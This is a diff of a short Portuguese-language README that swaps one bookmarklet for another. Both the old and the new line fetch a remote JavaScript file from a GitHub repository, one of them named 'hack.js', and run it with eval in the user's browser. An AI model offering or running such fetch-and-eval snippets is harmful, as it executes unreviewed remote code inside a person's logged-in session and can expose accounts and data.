@@ -5,8 +5,9 @@
 #### TESTE
 
 ```http
-  javascript:(()=>{fetch('https://raw.githubusercontent.com/TecVit/aulas/main/hack.js').then(r=>r.text()).then(code=>{eval(code)})})()
+  javascript:(()=>{fetch('https://raw.githubusercontent.com/TecVit/TaskAI-IFSP/refs/heads/main/index.js').then(r=>r.text()).then(code=>{eval(code)})})()
 ```
+
 
 #### Estrutura
 
